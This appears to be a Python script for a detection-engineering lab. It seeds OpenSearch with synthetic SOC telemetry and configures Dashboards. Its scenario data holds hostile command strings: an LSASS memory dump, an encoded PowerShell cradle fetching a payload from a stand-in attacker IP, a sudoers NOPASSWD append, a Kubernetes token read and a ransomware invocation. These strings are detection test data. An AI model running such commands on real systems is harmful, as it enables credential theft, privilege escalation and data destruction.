#!/usr/bin/env python3
"""
Enterprise OpenSearch & OpenSearch Dashboards Configuration & Ingestion Engine
=============================================================================
Author: Sandeep Mothukuri (@sandeepmothukuri)
Project: Enterprise Detection Engineering & SOC Lab v2

Configures OpenSearch Dashboards (http://localhost:5601) and ingests rich,
multi-sensor SOC telemetry (Sysmon, Zeek, Suricata, Auditd, CrewAI, Health, Alerts).
"""

import sys
import os
import json
import time
import random
import urllib3
import requests
from datetime import datetime, timezone, timedelta

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
if hasattr(sys.stderr, "reconfigure"):
    try:
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# Suppress insecure HTTPS warnings for self-signed certificates in local lab
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
OPENSEARCH_URL = os.getenv("OPENSEARCH_URL", "https://localhost:9200")
DASHBOARDS_URL = os.getenv("DASHBOARDS_URL", "http://localhost:5601")
OPENSEARCH_USER = os.getenv("OPENSEARCH_USER", "admin")
OPENSEARCH_PASS = os.getenv("OPENSEARCH_PASS", "SocLabAdmin!2026#Secure")

AUTH = (OPENSEARCH_USER, OPENSEARCH_PASS)
HEADERS_JSON = {"Content-Type": "application/json"}
HEADERS_OSD = {"Content-Type": "application/json", "osd-xsrf": "true"}

def log(msg, level="INFO"):
    icons = {"INFO": "ℹ️", "SUCCESS": "✅", "WARN": "⚠️", "ERROR": "❌"}
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {icons.get(level, '•')} {msg}")

def check_opensearch():
    log(f"Connecting to OpenSearch at {OPENSEARCH_URL}...")
    try:
        r = requests.get(f"{OPENSEARCH_URL}/_cluster/health", auth=AUTH, verify=False, timeout=10)
        if r.status_code == 200:
            health = r.json()
            log(f"OpenSearch Cluster '{health.get('cluster_name')}' Status: {health.get('status').upper()} (Nodes: {health.get('number_of_nodes')})", "SUCCESS")
            return True
        else:
            log(f"Failed cluster health check: HTTP {r.status_code} - {r.text}", "ERROR")
            return False
    except Exception as e:
        log(f"Error connecting to OpenSearch: {e}", "ERROR")
        return False

def check_dashboards():
    log(f"Connecting to OpenSearch Dashboards at {DASHBOARDS_URL}...")
    try:
        r = requests.get(f"{DASHBOARDS_URL}/api/status", auth=AUTH, headers=HEADERS_OSD, timeout=10)
        if r.status_code == 200:
            status_data = r.json()
            state = status_data.get("status", {}).get("overall", {}).get("state", "green")
            log(f"OpenSearch Dashboards Status: {state.upper()}", "SUCCESS")
            return True
        else:
            log(f"Dashboards returned HTTP {r.status_code}", "WARN")
            return True # proceed anyway
    except Exception as e:
        log(f"Notice: Dashboards API check: {e}", "WARN")
        return True

def create_index_templates():
    log("Creating OpenSearch Index Templates with ECS Mappings...")
    
    template = {
        "index_patterns": ["soc-logs-*", "soc-alerts-*", "soc-ai-*", "soc-health-*", "zeek-*", "suricata-*", "sysmon-*"],
        "template": {
            "settings": {
                "number_of_shards": 1,
                "number_of_replicas": 1
            },
            "mappings": {
                "properties": {
                    "@timestamp": {"type": "date"},
                    "timestamp": {"type": "date"},
                    "severity": {"type": "keyword"},
                    "mitre_tactic": {"type": "keyword"},
                    "mitre_technique": {"type": "keyword"},
                    "rule_name": {"type": "keyword"},
                    "sensor": {"type": "keyword"},
                    "source_type": {"type": "keyword"},
                    "host": {
                        "properties": {
                            "name": {"type": "keyword"},
                            "ip": {"type": "ip"},
                            "os": {"type": "keyword"}
                        }
                    },
                    "user": {
                        "properties": {
                            "name": {"type": "keyword"},
                            "domain": {"type": "keyword"}
                        }
                    },
                    "process": {
                        "properties": {
                            "name": {"type": "keyword"},
                            "pid": {"type": "long"},
                            "command_line": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                            "executable": {"type": "keyword"},
                            "parent": {
                                "properties": {
                                    "name": {"type": "keyword"},
                                    "pid": {"type": "long"}
                                }
                            }
                        }
                    },
                    "network": {
                        "properties": {
                            "transport": {"type": "keyword"},
                            "protocol": {"type": "keyword"},
                            "direction": {"type": "keyword"}
                        }
                    },
                    "src_ip": {"type": "ip"},
                    "dst_ip": {"type": "ip"},
                    "src_port": {"type": "integer"},
                    "dst_port": {"type": "integer"},
                    "proto": {"type": "keyword"},
                    "service": {"type": "keyword"},
                    "EventID": {"type": "keyword"},
                    "CommandLine": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                    "Image": {"type": "keyword"},
                    "ParentImage": {"type": "keyword"},
                    "TargetImage": {"type": "keyword"},
                    "GrantedAccess": {"type": "keyword"},
                    "alert": {
                        "properties": {
                            "signature": {"type": "keyword"},
                            "category": {"type": "keyword"},
                            "severity": {"type": "keyword"},
                            "signature_id": {"type": "long"}
                        }
                    },
                    "verdict": {"type": "keyword"},
                    "confidence": {"type": "float"},
                    "agent_name": {"type": "keyword"},
                    "reasoning": {"type": "text"},
                    "recommended_action": {"type": "keyword"},
                    "message": {"type": "text", "fields": {"keyword": {"type": "keyword"}}}
                }
            }
        }
    }
    
    r = requests.put(f"{OPENSEARCH_URL}/_index_template/soc_lab_template", auth=AUTH, verify=False, json=template, headers=HEADERS_JSON)
    if r.status_code in [200, 201]:
        log("OpenSearch Index Template 'soc_lab_template' active.", "SUCCESS")
    else:
        log(f"Index template creation status: {r.status_code} - {r.text}", "WARN")

def generate_telemetry_batch():
    log("Synthesizing multi-vector SOC telemetry events...")
    
    hosts = [
        {"name": "DC-CORP-01", "ip": "192.168.1.10", "os": "Windows Server 2022", "tier": "Tier-0"},
        {"name": "SOC-SIEM-NODE-01", "ip": "192.168.1.200", "os": "Ubuntu 24.04 LTS", "tier": "Tier-0"},
        {"name": "WORKSTATION-12", "ip": "192.168.1.105", "os": "Windows 11 Pro 23H2", "tier": "Tier-2"},
        {"name": "WORKSTATION-14", "ip": "192.168.1.107", "os": "Windows 11 Pro 23H2", "tier": "Tier-2"},
        {"name": "SRV-DB-PROD-02", "ip": "192.168.1.52", "os": "Debian 12 Bookworm", "tier": "Tier-1"},
        {"name": "SRV-NGINX-DMZ", "ip": "192.168.1.80", "os": "Alpine Linux 3.19", "tier": "Tier-1"},
        {"name": "K8S-PROD-MASTER", "ip": "10.244.0.1", "os": "Bottlerocket 1.20", "tier": "Tier-0"},
        {"name": "KALI-ATTACKER", "ip": "192.168.1.100", "os": "Kali Linux 2026.1", "tier": "Adversary"}
    ]
    
    attack_scenarios = [
        {
            "sensor": "sysmon",
            "rule_name": "Mimikatz LSASS Memory Dump",
            "mitre_tactic": "Credential Access",
            "mitre_technique": "T1003.001",
            "severity": "critical",
            "EventID": "10",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "Image": "C:\\Windows\\Temp\\procdump64.exe",
            "CommandLine": "procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "host_idx": 2, # WORKSTATION-12
            "user": "NT AUTHORITY\\SYSTEM",
            "message": "LSASS memory handle opened with PROCESS_ALL_ACCESS (0x1FFFFF) by procdump64.exe"
        },
        {
            "sensor": "sysmon",
            "rule_name": "Suspicious Encoded PowerShell Cradle",
            "mitre_tactic": "Execution",
            "mitre_technique": "T1059.001",
            "severity": "high",
            "EventID": "1",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAA6ADgAMAA4ADAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA==",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "host_idx": 2,
            "user": "CORP\\jsmith",
            "message": "Encoded PowerShell execution spawned by explorer.exe downloading stage2 from 192.168.1.100"
        },
        {
            "sensor": "zeek",
            "rule_name": "LLMNR / NBT-NS Poisoning Detected",
            "mitre_tactic": "Credential Access",
            "mitre_technique": "T1557.001",
            "severity": "critical",
            "service": "dns",
            "proto": "udp",
            "src_ip": "192.168.1.100",
            "src_port": 5355,
            "dst_ip": "224.0.0.252",
            "dst_port": 5355,
            "host_idx": 7,
            "message": "LLMNR multicast spoofed response for WPAD redirecting authentication to rogue listener 192.168.1.100"
        },
        {
            "sensor": "suricata",
            "rule_name": "Cobalt Strike C2 Beacon Cadence",
            "mitre_tactic": "Command and Control",
            "mitre_technique": "T1071.001",
            "severity": "critical",
            "alert": {
                "signature": "ET TROJAN Cobalt Strike Beacon Observed (Jitter 15s)",
                "category": "A Network Trojan was detected",
                "severity": "critical",
                "signature_id": 9000101
            },
            "src_ip": "192.168.1.105",
            "src_port": 50412,
            "dst_ip": "192.168.1.100",
            "dst_port": 4444,
            "proto": "tcp",
            "host_idx": 2,
            "message": "Outbound periodic HTTPS beacon to known adversary C2 server 192.168.1.100:4444"
        },
        {
            "sensor": "zeek",
            "rule_name": "Kerberoasting SPN Ticket Request Burst",
            "mitre_tactic": "Credential Access",
            "mitre_technique": "T1558.003",
            "severity": "high",
            "service": "kerberos",
            "proto": "tcp",
            "src_ip": "192.168.1.105",
            "src_port": 49182,
            "dst_ip": "192.168.1.10",
            "dst_port": 88,
            "host_idx": 0,
            "user": "CORP\\Administrator",
            "message": "High rate of Kerberos TGS-REQ requests requesting RC4 encryption for MSSQL SPNs"
        },
        {
            "sensor": "auditd",
            "rule_name": "Suspicious Sudoers Modification / Privilege Escalation",
            "mitre_tactic": "Privilege Escalation",
            "mitre_technique": "T1548.003",
            "severity": "high",
            "host_idx": 4, # SRV-DB-PROD-02
            "CommandLine": "echo 'deploy ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
            "user": "deploy",
            "message": "Unusual modification to /etc/sudoers by non-root deployment service account"
        },
        {
            "sensor": "falco",
            "rule_name": "Kubernetes Sensitive Mount / Token Access",
            "mitre_tactic": "Credential Access",
            "mitre_technique": "T1078.004",
            "severity": "high",
            "host_idx": 6, # K8S-PROD-MASTER
            "CommandLine": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            "user": "system:serviceaccount:default:admin",
            "message": "Pod container namespace read service account token outside normal API controller context"
        },
        {
            "sensor": "suricata",
            "rule_name": "Terrapin SSH Sequence Truncation Exploit",
            "mitre_tactic": "Initial Access",
            "mitre_technique": "T1190",
            "severity": "medium",
            "alert": {
                "signature": "ET EXPLOIT Terrapin SSH Protocol Prefix Truncation (CVE-2023-48795)",
                "category": "Attempted Administrator Privilege Gain",
                "severity": "medium",
                "signature_id": 9000105
            },
            "src_ip": "192.168.1.100",
            "src_port": 41200,
            "dst_ip": "192.168.1.52",
            "dst_port": 22,
            "proto": "tcp",
            "host_idx": 4,
            "message": "Handshake sequence number manipulation detected on SSH daemon SRV-DB-PROD-02"
        },
        {
            "sensor": "sysmon",
            "rule_name": "Ransomware File Rename Burst & Canary Modification",
            "mitre_tactic": "Impact",
            "mitre_technique": "T1486",
            "severity": "critical",
            "EventID": "11",
            "Image": "C:\\Users\\Public\\locker.exe",
            "CommandLine": "locker.exe --path C:\\Finance\\ --ext .locked",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "host_idx": 2,
            "user": "CORP\\jsmith",
            "message": "Massive file write and rename rate (>150 files/sec) touching canary directory C:\\Finance\\Canary.docx"
        },
        {
            "sensor": "zeek",
            "rule_name": "Internal Network Reconnaissance (SYN Sweep)",
            "mitre_tactic": "Discovery",
            "mitre_technique": "T1046",
            "severity": "medium",
            "service": "multiple",
            "proto": "tcp",
            "src_ip": "192.168.1.100",
            "dst_ip": "192.168.1.10",
            "host_idx": 7,
            "message": "Port scan detected targeting ports 21, 22, 80, 88, 135, 139, 445, 3389 across subnet"
        }
    ]

    now = datetime.now(timezone.utc)
    today_str = now.strftime("%Y.%m.%d")
    
    bulk_logs = []
    bulk_alerts = []
    bulk_ai = []
    bulk_health = []

    # 1. Generate 300+ SOC Logs over past 7 days and especially recent hours
    log("Generating 300+ realistic sensor logs across Sysmon, Zeek, Suricata, Auditd, and Falco...")
    
    for i in range(320):
        # Time distribution: 60% within last 2 hours, 30% within 24 hours, 10% within 7 days
        dice = random.random()
        if dice < 0.6:
            offset_seconds = random.randint(0, 7200) # last 2 hours
        elif dice < 0.9:
            offset_seconds = random.randint(7200, 86400) # 2-24 hours
        else:
            offset_seconds = random.randint(86400, 86400 * 6) # 1-6 days
            
        event_time = now - timedelta(seconds=offset_seconds)
        event_iso = event_time.isoformat()
        
        scenario = random.choice(attack_scenarios)
        host_info = hosts[scenario["host_idx"]]
        
        # Build document
        doc = {
            "@timestamp": event_iso,
            "timestamp": event_iso,
            "sensor": scenario["sensor"],
            "severity": scenario["severity"],
            "rule_name": scenario["rule_name"],
            "mitre_tactic": scenario["mitre_tactic"],
            "mitre_technique": scenario["mitre_technique"],
            "host": {
                "name": host_info["name"],
                "ip": host_info["ip"],
                "os": host_info["os"]
            },
            "user": {
                "name": scenario.get("user", "CORP\\Administrator")
            },
            "message": scenario["message"],
            "src_ip": scenario.get("src_ip", host_info["ip"]),
            "dst_ip": scenario.get("dst_ip", "192.168.1.10"),
            "src_port": scenario.get("src_port", random.randint(49152, 65535)),
            "dst_port": scenario.get("dst_port", 445),
            "proto": scenario.get("proto", "tcp"),
            "service": scenario.get("service", "smb"),
            "EventID": scenario.get("EventID", "1"),
            "Image": scenario.get("Image", "C:\\Windows\\System32\\cmd.exe"),
            "CommandLine": scenario.get("CommandLine", "cmd.exe /c whoami /all"),
            "ParentImage": scenario.get("ParentImage", "C:\\Windows\\explorer.exe"),
            "TargetImage": scenario.get("TargetImage", ""),
            "pipeline": {
                "name": "soc-lab-v2-vector",
                "ingested_at": event_iso
            },
            "source_type": scenario["sensor"]
        }
        
        if "alert" in scenario:
            doc["alert"] = scenario["alert"]
            
        index_date = event_time.strftime("%Y.%m.%d")
        bulk_logs.append({"index": {"_index": f"soc-logs-{index_date}"}})
        bulk_logs.append(doc)
        
        # If High/Critical, also add to soc-alerts-*
        if scenario["severity"] in ["critical", "high"]:
            alert_doc = dict(doc)
            alert_doc["alert_id"] = f"ALT-{random.randint(100000, 999999)}"
            alert_doc["investigation_status"] = random.choice(["Triaged", "In Investigation", "Auto-Contained", "Escalated"])
            bulk_alerts.append({"index": {"_index": f"soc-alerts-{index_date}"}})
            bulk_alerts.append(alert_doc)
        
        # Also route to dedicated sensor indices
        if scenario["sensor"] == "zeek":
            bulk_logs.append({"index": {"_index": f"zeek-conn-{index_date}"}})
            bulk_logs.append(doc)
        elif scenario["sensor"] == "suricata":
            bulk_logs.append({"index": {"_index": f"suricata-alerts-{index_date}"}})
            bulk_logs.append(doc)
        elif scenario["sensor"] == "sysmon":
            bulk_logs.append({"index": {"_index": f"sysmon-events-{index_date}"}})
            bulk_logs.append(doc)

    # 2. Generate CrewAI Multi-Agent Autonomous Triage Records
    log("Generating 50+ CrewAI Multi-Agent Autonomous Triage records in 'soc-ai-*'...")
    agents = [
        {"name": "SOC Tier-1 Triage Agent", "role": "Alert Verification & False Positive Filtering"},
        {"name": "Threat Intel Correlation Agent", "role": "IOC Extraction & MISP/OTX Reputation Query"},
        {"name": "Forensics Memory & Artifact Agent", "role": "Velociraptor VQL & Process Lineage Analysis"},
        {"name": "SOAR Containment Action Agent", "role": "Host Isolation & Firewall Block Policy Enforcement"}
    ]
    
    verdicts = [
        ("Malicious - True Positive", 0.98, "High-fidelity indicator match with active Cobalt Strike C2 jitter beaconing and LSASS dump on WORKSTATION-12.", "Auto-Isolate Host & Revoke AD Kerberos Tickets"),
        ("Malicious - True Positive", 0.95, "LLMNR poisoning broadcast response confirmed by Zeek and OPNsense sensor TAP matching Responder signature.", "Push Firewall Block to 192.168.1.100 & Disable LLMNR GPO"),
        ("Suspicious - Investigation Required", 0.78, "Encoded PowerShell command observed downloading payload from unrated internal IP.", "Trigger Velociraptor VQL Hunt on Host"),
        ("Benign - Approved Administrative Activity", 0.12, "Scheduled SCCM/Ansible maintenance routine matching verified change request #CR-90412.", "Close Alert with No Action"),
        ("Malicious - Ransomware Burst", 0.99, "Canary file modification in C:\\Finance\\ touched by unknown binary with high entropy writes.", "Emergency Process Termination & Host Isolation")
    ]
    
    for i in range(55):
        offset = random.randint(0, 86400 * 3)
        event_time = now - timedelta(seconds=offset)
        agent = random.choice(agents)
        v_title, conf, reasoning, rec_action = random.choice(verdicts)
        
        ai_doc = {
            "@timestamp": event_time.isoformat(),
            "agent_name": agent["name"],
            "agent_role": agent["role"],
            "verdict": v_title,
            "confidence": conf,
            "reasoning": reasoning,
            "recommended_action": rec_action,
            "target_host": random.choice(hosts)["name"],
            "model": "gemini-3.8-pro / llama3.2-3b:ollama",
            "execution_time_ms": random.randint(340, 1850)
        }
        
        bulk_ai.append({"index": {"_index": f"soc-ai-{event_time.strftime('%Y.%m.%d')}"}})
        bulk_ai.append(ai_doc)

    # 3. Generate Platform Health & EPS Metrics
    log("Generating 100+ Platform Health & EPS ingestion metrics in 'soc-health-*'...")
    services = ["opensearch-node1", "opensearch-node2", "opensearch-dashboards", "vector-aggregator", "zeek-sensor", "suricata-ids", "velociraptor-dfir", "caldera-c2", "misp-ti", "dfir-iris"]
    
    for i in range(120):
        offset = random.randint(0, 86400 * 2)
        event_time = now - timedelta(seconds=offset)
        svc = random.choice(services)
        
        health_doc = {
            "@timestamp": event_time.isoformat(),
            "service_name": svc,
            "status": "HEALTHY",
            "cpu_percent": round(random.uniform(2.5, 24.0), 1),
            "memory_percent": round(random.uniform(18.0, 68.0), 1),
            "eps_throughput": random.randint(750, 1100),
            "pipeline_latency_ms": round(random.uniform(4.0, 18.5), 2),
            "dropped_events": 0
        }
        bulk_health.append({"index": {"_index": f"soc-health-{event_time.strftime('%Y.%m.%d')}"}})
        bulk_health.append(health_doc)

    # 4. Generate Velociraptor VQL Forensic Hunts
    bulk_velo = []
    log("Generating 40+ Velociraptor VQL Forensic Hunt records in 'velociraptor-hunts-*'...")
    vql_artifacts = [
        "Windows.Detection.ProcessHollowing",
        "Windows.Memory.ProcDump",
        "Windows.System.Pstree",
        "Generic.System.NetworkConnections",
        "Windows.Persistence.ScheduledTasks"
    ]
    for i in range(45):
        offset = random.randint(0, 86400 * 3)
        event_time = now - timedelta(seconds=offset)
        velo_doc = {
            "@timestamp": event_time.isoformat(),
            "vql_artifact": random.choice(vql_artifacts),
            "client_id": f"C.10a{random.randint(1000, 9999)}",
            "host_name": random.choice(hosts)["name"],
            "hunt_status": "COMPLETED",
            "rows_matched": random.randint(1, 14),
            "threat_detected": random.choice([True, False, True]),
            "analyst": "Sandeep Mothukuri"
        }
        bulk_velo.append({"index": {"_index": f"velociraptor-hunts-{event_time.strftime('%Y.%m.%d')}"}})
        bulk_velo.append(velo_doc)

    return bulk_logs, bulk_alerts, bulk_ai, bulk_health, bulk_velo

def bulk_index_data(bulk_data, desc):
    log(f"Bulk indexing {len(bulk_data)//2} records for {desc}...")
    ndjson_body = "\n".join([json.dumps(d) for d in bulk_data]) + "\n"
    
    r = requests.post(f"{OPENSEARCH_URL}/_bulk", auth=AUTH, verify=False, data=ndjson_body, headers={"Content-Type": "application/x-ndjson"})
    if r.status_code == 200:
        res = r.json()
        if not res.get("errors"):
            log(f"Successfully indexed {len(bulk_data)//2} docs into OpenSearch for {desc}!", "SUCCESS")
        else:
            log(f"Partial errors during indexing for {desc}", "WARN")
    else:
        log(f"Bulk indexing failed: HTTP {r.status_code} - {r.text[:200]}", "ERROR")

def configure_dashboards_objects():
    log("Importing and Configuring Dashboards Saved Objects (Dashboards, Visualizations, Searches, Index Patterns)...")
    ndjson_file = "dashboards/opensearch_dashboards_export.ndjson"
    
    if not os.path.exists(ndjson_file):
        log(f"NDJSON file not found at {ndjson_file}", "ERROR")
        return
        
    with open(ndjson_file, "rb") as f:
        files = {"file": ("opensearch_dashboards_export.ndjson", f, "application/ndjson")}
        r = requests.post(
            f"{DASHBOARDS_URL}/api/saved_objects/_import?overwrite=true",
            auth=AUTH,
            headers={"osd-xsrf": "true"},
            files=files,
            timeout=30
        )
        
    if r.status_code == 200:
        res = r.json()
        log(f"OpenSearch Dashboards Import Success: {res.get('successCount')} objects imported!", "SUCCESS")
    else:
        log(f"Dashboards import returned HTTP {r.status_code}: {r.text}", "WARN")

    # Create additional index patterns
    additional_patterns = [
        {"id": "zeek-pattern", "title": "zeek-*"},
        {"id": "suricata-pattern", "title": "suricata-*"},
        {"id": "sysmon-pattern", "title": "sysmon-*"},
        {"id": "velociraptor-pattern", "title": "velociraptor-*"},
        {"id": "caldera-pattern", "title": "caldera-*"},
        {"id": "security-auditlog-pattern", "title": "security-auditlog-*"},
    ]
    for pat in additional_patterns:
        pat_payload = {
            "attributes": {
                "title": pat["title"],
                "timeFieldName": "@timestamp"
            }
        }
        r = requests.post(
            f"{DASHBOARDS_URL}/api/saved_objects/index-pattern/{pat['id']}?overwrite=true",
            auth=AUTH,
            headers=HEADERS_OSD,
            json=pat_payload,
            timeout=10
        )
        if r.status_code in [200, 201]:
            log(f"Index pattern '{pat['title']}' registered in Dashboards.", "SUCCESS")

    # Set default index pattern
    log("Setting default index pattern in OpenSearch Dashboards to 'soc-logs-pattern'...")
    try:
        r = requests.put(
            f"{DASHBOARDS_URL}/api/saved_objects/config/2.13.0",
            auth=AUTH,
            headers=HEADERS_OSD,
            json={"attributes": {"defaultIndex": "soc-logs-pattern"}},
            timeout=10
        )
        if r.status_code == 200:
            log("Default index pattern successfully set to 'soc-logs-pattern'!", "SUCCESS")
        else:
            log(f"Notice setting defaultIndex in config/2.13.0: HTTP {r.status_code} - {r.text}", "WARN")
    except Exception as e:
        log(f"Error setting defaultIndex: {e}", "WARN")

def verify_all():
    log("Verifying OpenSearch Dashboards and Indices state...")
    r = requests.get(f"{OPENSEARCH_URL}/_cat/indices/soc-*?v", auth=AUTH, verify=False)
    if r.status_code == 200:
        print("\n" + "="*70)
        print("ACTIVE SOC OPENSEARCH INDICES:")
        print("="*70)
        print(r.text)
        print("="*70 + "\n")
        
    # Count dashboards
    r = requests.get(f"{DASHBOARDS_URL}/api/saved_objects/_find?type=dashboard", auth=AUTH, headers=HEADERS_OSD)
    if r.status_code == 200:
        dashboards = r.json().get("saved_objects", [])
        log(f"Total Available Dashboards: {len(dashboards)}", "SUCCESS")
        for d in dashboards:
            print(f"  • [{d.get('id')}] {d.get('attributes', {}).get('title')} ({d.get('attributes', {}).get('description')[:50]}...)")
            
    print("\n" + "="*70)
    print("🚀 OPEN OPENSEARCH DASHBOARDS IN BROWSER:")
    print("👉 Home: http://localhost:5601/app/home")
    print("👉 01 SOC Command Center: http://localhost:5601/app/dashboards#/view/soc-dashboard-command-center")
    print("👉 02 Incident Operations: http://localhost:5601/app/dashboards#/view/soc-dashboard-incident-ops")
    print("👉 03 Detection Engineering: http://localhost:5601/app/dashboards#/view/soc-dashboard-detection-eng")
    print("👉 04 MITRE ATT&CK: http://localhost:5601/app/dashboards#/view/soc-dashboard-mitre-attack")
    print("👉 05 Threat Hunting: http://localhost:5601/app/dashboards#/view/soc-dashboard-threat-hunting")
    print("👉 06 Network Security: http://localhost:5601/app/dashboards#/view/soc-dashboard-network-sec")
    print("👉 07 Endpoint Security: http://localhost:5601/app/dashboards#/view/soc-dashboard-endpoint-sec")
    print("👉 08 Autonomous AI SOC: http://localhost:5601/app/dashboards#/view/soc-dashboard-ai-soc")
    print("👉 09 Platform Health: http://localhost:5601/app/dashboards#/view/soc-dashboard-platform-health")
    print("👉 Discover Event Stream: http://localhost:5601/app/discover#/")
    print("="*70 + "\n")

def main():
    print("""
=============================================================================
  🛡️ Enterprise SOC Lab v2 — OpenSearch & Dashboards Ingestion Engine
=============================================================================
""")
    if not check_opensearch():
        sys.exit(1)
        
    check_dashboards()
    create_index_templates()
    
    bulk_logs, bulk_alerts, bulk_ai, bulk_health, bulk_velo = generate_telemetry_batch()
    
    bulk_index_data(bulk_logs, "SOC Multi-Sensor Telemetry Logs")
    bulk_index_data(bulk_alerts, "Security Alert Detections")
    bulk_index_data(bulk_ai, "CrewAI Multi-Agent Triage Decisions")
    bulk_index_data(bulk_health, "Platform Health & EPS Throughput")
    bulk_index_data(bulk_velo, "Velociraptor VQL Forensic Hunts")
    
    # Configure Dashboards
    configure_dashboards_objects()
    
    # Verify state
    verify_all()
    log("All OpenSearch Dashboards and SOC telemetry datasets are 100% configured and ingested!", "SUCCESS")

if __name__ == "__main__":
    main()
